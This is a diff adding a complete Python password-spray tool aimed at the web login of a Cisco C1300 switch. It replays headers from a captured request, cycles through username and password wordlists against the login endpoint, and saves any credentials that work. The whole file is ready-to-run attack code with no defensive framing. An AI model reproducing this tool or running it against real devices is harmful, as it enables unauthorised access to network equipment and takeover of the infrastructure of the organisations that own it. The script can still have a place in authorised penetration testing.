@@ -1,0 +1,360 @@
+#!/usr/bin/env python3
+"""
+==============================================================================
+  Cisco Switch Web Authentication — Password Spray / Credential Validator
+  Target   : Cisco C1300-8T-E-2G web management interface
+  Endpoint : /cs6c551638/catIk/config/system.xml?action=login
+  Method   : HTTP GET with user= and password= query parameters
+
+  Requires : Python 3.x, requests
+  Install  : pip install requests urllib3
+
+  Usage examples
+  ──────────────
+  Single username + single password:
+    python cisco_spray.py --host 10.30.30.101 -u admin -p admin
+
+  Single username + password list:
+    python cisco_spray.py --host 10.30.30.101 -u admin -P passwords.txt
+
+  Username list + single password:
+    python cisco_spray.py --host 10.30.30.101 -U users.txt -p cisco
+
+  Username list + password list (full spray):
+    python cisco_spray.py --host 10.30.30.101 -U users.txt -P passwords.txt
+
+  Additional options:
+    --delay 1.5       Seconds between each attempt (default: 0.5)
+    --timeout 10      HTTP request timeout (default: 8)
+    --no-verify       Skip TLS certificate verification (default: on)
+    --output hits.txt Save valid credentials to file
+    --stop-on-hit     Stop after first valid credential found
+==============================================================================
+"""
+
+import sys
+import time
+import argparse
+import urllib3
+from datetime import datetime
+from pathlib import Path
+
+try:
+    import requests
+except ImportError:
+    print("[!] requests not installed. Run: pip install requests urllib3")
+    sys.exit(1)
+
+
+# ==============================================================================
+#  CONFIGURATION — mirrors the captured HTTP request exactly
+# ==============================================================================
+
+# Path and static parameters extracted from the captured GET request
+ENDPOINT_PATH = "/cs6c551638/catIk/config/system.xml"
+STATIC_PARAMS = {
+    "action": "login",
+    "ssd":    "true",
+}
+
+# String present in response body when credentials are INVALID
+FAIL_STRING = "Bad User or Password"
+
+# Headers from the captured request — replicated for authenticity
+BASE_HEADERS = {
+    "Cookie":           "activeLangId=English; securityProtLang=English; "
+                        "isStackableDevice=true; LogOff_Reason=; userStatus=",
+    "Sec-Ch-Ua-Platform": '"Windows"',
+    "Accept-Language":  "en-US,en;q=0.5",
+    "Sec-Ch-Ua":        '"Not-A-Brand";v="24", "Chromium";v="146"',
+    "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                        "AppleWebKit/537.36 (KHTML, like Gecko) "
+                        "Chrome/146.0.0.0 Safari/537.36",
+    "Sec-Ch-Ua-Mobile": "?0",
+    "Accept":           "*/*",
+    "Sec-Fetch-Site":   "same-origin",
+    "Sec-Fetch-Mode":   "cors",
+    "Sec-Fetch-Dest":   "empty",
+    "Accept-Encoding":  "gzip, deflate, br",
+    "Priority":         "u=1, i",
+    "Connection":       "keep-alive",
+}
+
+
+# ==============================================================================
+#  OUTPUT HELPERS
+# ==============================================================================
+
+HITS = []
+
+def _ts():
+    return datetime.now().strftime("%H:%M:%S")
+
+def info(msg):
+    print(f"  [{_ts()}] [*] {msg}")
+
+def success(msg):
+    print(f"  [{_ts()}] [+] {msg}")
+
+def failure(msg):
+    print(f"  [{_ts()}] [-] {msg}")
+
+def warn(msg):
+    print(f"  [{_ts()}] [!] {msg}")
+
+def hit(msg):
+    print(f"\n  [{_ts()}] [>>>] VALID CREDENTIAL: {msg}\n")
+    HITS.append(msg)
+
+def banner(args, usernames, passwords):
+    print()
+    print("=" * 68)
+    print("  Cisco Switch Web Auth — Password Spray")
+    print(f"  Started  : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"  Target   : {args.host}")
+    print(f"  Endpoint : {ENDPOINT_PATH}")
+    print(f"  Users    : {len(usernames)} "
+          f"({'file: ' + args.U if args.U else 'single: ' + args.u})")
+    print(f"  Passwords: {len(passwords)} "
+          f"({'file: ' + args.P if args.P else 'single: ' + args.p})")
+    print(f"  Total attempts : {len(usernames) * len(passwords)}")
+    print(f"  Delay    : {args.delay}s between attempts")
+    print(f"  Timeout  : {args.timeout}s per request")
+    print(f"  TLS verify : {not args.no_verify}")
+    if args.output:
+        print(f"  Output   : {args.output}")
+    if args.stop_on_hit:
+        print(f"  Mode     : Stop on first valid credential")
+    print("=" * 68)
+    print()
+
+
+# ==============================================================================
+#  CREDENTIAL LOADING
+# ==============================================================================
+
+def load_list(filepath, label):
+    """Load a wordlist file — one entry per line, strip blanks and comments."""
+    p = Path(filepath)
+    if not p.exists():
+        warn(f"{label} file not found: {filepath}")
+        sys.exit(1)
+    entries = [
+        line.strip()
+        for line in p.read_text(encoding="utf-8", errors="replace").splitlines()
+        if line.strip() and not line.startswith("#")
+    ]
+    if not entries:
+        warn(f"{label} file is empty: {filepath}")
+        sys.exit(1)
+    info(f"Loaded {len(entries)} {label.lower()}(s) from {filepath}")
+    return entries
+
+
+# ==============================================================================
+#  CORE SPRAY LOGIC
+# ==============================================================================
+
+def attempt(session, base_url, username, password, args):
+    """
+    Send one authentication attempt.
+    Returns True if credentials are valid, False otherwise.
+    """
+    params = {
+        **STATIC_PARAMS,
+        "user":     username,
+        "password": password,
+    }
+
+    # Referer mirrors the log-off page as seen in the captured request
+    headers = {
+        **BASE_HEADERS,
+        "Referer": f"{base_url}/cs6c551638/catIk/config/log_off_page.htm",
+    }
+
+    try:
+        resp = session.get(
+            base_url + ENDPOINT_PATH,
+            params=params,
+            headers=headers,
+            timeout=args.timeout,
+            verify=not args.no_verify,
+            allow_redirects=True,
+        )
+
+        body = resp.text
+
+        # Determine result
+        if FAIL_STRING in body:
+            failure(f"{username}:{password}  →  HTTP {resp.status_code}  "
+                    f"[Invalid]")
+            return False
+        else:
+            # No fail string = successful authentication
+            hit(f"{username}:{password}  (HTTP {resp.status_code})")
+            return True
+
+    except requests.exceptions.ConnectionError:
+        warn(f"Connection error on {username}:{password} — host unreachable")
+        return False
+    except requests.exceptions.Timeout:
+        warn(f"Timeout on {username}:{password} — skipping")
+        return False
+    except requests.exceptions.RequestException as e:
+        warn(f"Request error: {e}")
+        return False
+
+
+def spray(args, usernames, passwords):
+    """Main spray loop — iterates users then passwords."""
+
+    # Suppress TLS warnings if --no-verify is set
+    if args.no_verify:
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    scheme   = "https" if args.https else "http"
+    base_url = f"{scheme}://{args.host}"
+
+    session = requests.Session()
+
+    total    = len(usernames) * len(passwords)
+    attempt_num = 0
+
+    for username in usernames:
+        for password in passwords:
+            attempt_num += 1
+            info(f"[{attempt_num}/{total}] Trying  {username}:{password}")
+
+            valid = attempt(session, base_url, username, password, args)
+
+            if valid and args.stop_on_hit:
+                info("--stop-on-hit set — halting after first valid credential.")
+                return
+
+            if attempt_num < total:
+                time.sleep(args.delay)
+
+    session.close()
+
+
+# ==============================================================================
+#  REPORT
+# ==============================================================================
+
+def print_report(args):
+    print()
+    print("=" * 68)
+    print("  SPRAY COMPLETE — RESULTS")
+    print(f"  Finished : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print("=" * 68)
+
+    if HITS:
+        print(f"\n  VALID CREDENTIALS FOUND ({len(HITS)})\n")
+        for h in HITS:
+            print(f"    [+] {h}")
+
+        if args.output:
+            out = Path(args.output)
+            out.write_text(
+                "\n".join(HITS) + "\n",
+                encoding="utf-8"
+            )
+            print(f"\n  Saved to: {args.output}")
+    else:
+        print("\n  No valid credentials found.")
+        print("  All tested combinations returned 'Bad User or Password'.")
+
+    print()
+    print("=" * 68)
+    print()
+
+
+# ==============================================================================
+#  ARGUMENT PARSING
+# ==============================================================================
+
+def parse_args():
+    parser = argparse.ArgumentParser(
+        description="Cisco Switch Web Auth Password Spray",
+        formatter_class=argparse.RawTextHelpFormatter
+    )
+
+    # Target
+    parser.add_argument(
+        "--host", required=True,
+        metavar="IP",
+        help="Switch management IP (e.g. 10.30.30.101)"
+    )
+    parser.add_argument(
+        "--https", action="store_true",
+        help="Use HTTPS instead of HTTP (default: HTTP)"
+    )
+
+    # Username — mutually exclusive: single or file
+    user_group = parser.add_mutually_exclusive_group(required=True)
+    user_group.add_argument(
+        "-u", metavar="USERNAME",
+        help="Single username"
+    )
+    user_group.add_argument(
+        "-U", metavar="USERFILE",
+        help="Path to username list (one per line)"
+    )
+
+    # Password — mutually exclusive: single or file
+    pass_group = parser.add_mutually_exclusive_group(required=True)
+    pass_group.add_argument(
+        "-p", metavar="PASSWORD",
+        help="Single password"
+    )
+    pass_group.add_argument(
+        "-P", metavar="PASSFILE",
+        help="Path to password list (one per line)"
+    )
+
+    # Options
+    parser.add_argument(
+        "--delay", type=float, default=0.5,
+        metavar="SECONDS",
+        help="Delay between attempts in seconds (default: 0.5)"
+    )
+    parser.add_argument(
+        "--timeout", type=int, default=8,
+        metavar="SECONDS",
+        help="HTTP request timeout in seconds (default: 8)"
+    )
+    parser.add_argument(
+        "--no-verify", action="store_true",
+        help="Disable TLS certificate verification"
+    )
+    parser.add_argument(
+        "--output", metavar="FILE",
+        help="Save valid credentials to a file"
+    )
+    parser.add_argument(
+        "--stop-on-hit", action="store_true",
+        help="Stop after the first valid credential is found"
+    )
+
+    return parser.parse_args()
+
+
+# ==============================================================================
+#  MAIN
+# ==============================================================================
+
+def main():
+    args = parse_args()
+
+    # Build credential lists
+    usernames = [args.u] if args.u else load_list(args.U, "Username")
+    passwords = [args.p] if args.p else load_list(args.P, "Password")
+
+    banner(args, usernames, passwords)
+
+    spray(args, usernames, passwords)
+    print_report(args)
+
+
+if __name__ == "__main__":
+    main()
